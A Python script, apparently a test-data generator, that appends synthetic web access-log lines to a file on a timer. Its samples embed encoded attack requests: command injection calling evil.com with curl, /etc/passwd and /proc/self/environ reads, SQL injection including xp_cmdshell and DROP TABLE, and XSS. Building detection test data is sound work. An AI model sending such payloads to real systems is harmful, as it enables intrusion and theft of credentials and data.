# log_generator.py
import time
import random

# Danh sách các dòng log mẫu để ghi vào file
LOG_SAMPLES = [
    '251.168.224.224 - - [05/Jun/2024:10:00:00 +0000] "PATCH /run?cmd=7c206375726c20687474703a2f2f6576696c2e636f6d HTTP/1.1" 405 1733 "-" "<script>alert(\"UA\")</script>"',
    '251.168.224.224 - - [05/Jun/2024:09:59:59 +0000] "GET /run?cmd=`id` HTTP/1.1" 499 4083 "-" "<script>alert(\"UA\")</script>"',
    '251.168.224.224 - - [05/Jun/2024:09:59:58 +0000] "POST /run?cmd=7c20636174202f6574632f706173737764 HTTP/1.1" 500 774 "-" "<script>alert(\"UA\")</script>"',
    '108.90.232.102 - - [19/Jul/2024:07:24:10 +0000] "POST /login?username=admin&password=2720554e494f4e2053454c454354204e554c4c2c4e554c4c2d2d HTTP/2.0" 404 2988 "-" "sqlmap/1.4.12.1#dev"',
    '108.90.232.102 - - [19/Jul/2024:07:24:09 +0000] "DELETE /view?file=2f70726f632f73656c662f656e7669726f6e HTTP/1.0" 200 1741 "-" "sqlmap/1.4.12.1#dev"',
    '108.90.232.102 - - [19/Jul/2024:07:24:04 +0000] "PATCH /login?username=admin&password=JyBBTkQgU0xFRVAoNSktLQ== HTTP/1.1" 400 2085 "-" "sqlmap/1.4.12.1#dev"',
    '108.90.232.102 - - [19/Jul/2024:07:24:09 +0000] "DELETE /view?file=/proc/self/environ HTTP/1.0" 200 3342 "-" "sqlmap/1.4.12.1#dev"',
    '108.90.232.102 - - [19/Jul/2024:07:24:12 +0000] "POST /view?file=L2V0Yy9wYXNzd2Q= HTTP/2.0" 200 3633 "-" "sqlmap/1.4.12.1#dev"',
    '108.90.232.102 - - [19/Jul/2024:07:24:09 +0000] "POST /view?file=/etc/passwd HTTP/1.0" 403 2408 "http://evil.com" "sqlmap/1.4.12.1#dev"',
    '108.90.232.102 - - [19/Jul/2024:07:24:08 +0000] "DELETE /login?username=admin&password=admin%2527%2520-- HTTP/2.0" 200 2885 "-" "sqlmap/1.4.12.1#dev"',
    '108.90.232.102 - - [19/Jul/2024:07:24:18 +0000] "GET /login?username=admin&password=2720414e4420534c4545502835292d2d HTTP/2.0" 500 2062 "-" "sqlmap/1.4.12.1#dev"',
    '108.90.232.102 - - [19/Jul/2024:07:24:19 +0000] "POST /view?file=2f70726f632f73656c662f656e7669726f6e HTTP/1.1" 200 3369 "-" "sqlmap/1.4.12.1#dev"',
    '108.90.232.102 - - [19/Jul/2024:07:24:16 +0000] "PATCH /view?file=2f6574632f706173737764 HTTP/1.0" 400 286 "-" "sqlmap/1.4.12.1#dev"',
    '108.90.232.102 - - [19/Jul/2024:07:24:20 +0000] "PATCH /login?username=admin&password=%2527%253B%2520EXEC%2520xp_cmdshell%2528%2527whoami%2527%2529%253B-- HTTP/1.1" 500 2957 "-" "sqlmap/1.4.12.1#dev"',
    '108.90.232.102 - - [19/Jul/2024:07:24:22 +0000] "DELETE /login?username=admin&password=JzsgRFJPUCBUQUJMRSB1c2VyczstLQ== HTTP/1.1" 500 3135 "-" "sqlmap/1.4.12.1#dev"',
    '108.90.232.102 - - [19/Jul/2024:07:24:19 +0000] "PATCH /view?file=/etc/passwd HTTP/2.0" 400 50 "http://evil.com" "sqlmap/1.4.12.1#dev"'
]

LOG_FILE = "normal.log"

def generate_logs():
    """
    Hàm này chạy một vòng lặp vô tận để ghi log vào file.
    """
    print(f"Log generator started. Appending to '{LOG_FILE}'.")
    print("Press CTRL+C to stop.")
    
    while True:
        try:
            # Chọn ngẫu nhiên một dòng log từ danh sách
            log_line = random.choice(LOG_SAMPLES)
            
            # Mở file ở chế độ 'a' (append - ghi tiếp vào cuối)
            # encoding='utf-8' là một lựa chọn an toàn
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(log_line + "\n")
            
            print(f"Appended: {log_line[:80]}...") # In ra log vừa ghi để theo dõi
            
            # Chờ một khoảng thời gian ngẫu nhiên từ 1 đến 5 giây
            sleep_time = random.uniform(10, 20)
            time.sleep(sleep_time)
            
        except KeyboardInterrupt:
            # Xử lý khi người dùng nhấn Ctrl+C
            print("\nLog generator stopped by user.")
            break
        except IOError as e:
            # Xử lý khi có lỗi ghi file
            print(f"\nError writing to file: {e}")
            break

if __name__ == "__main__":
    generate_logs()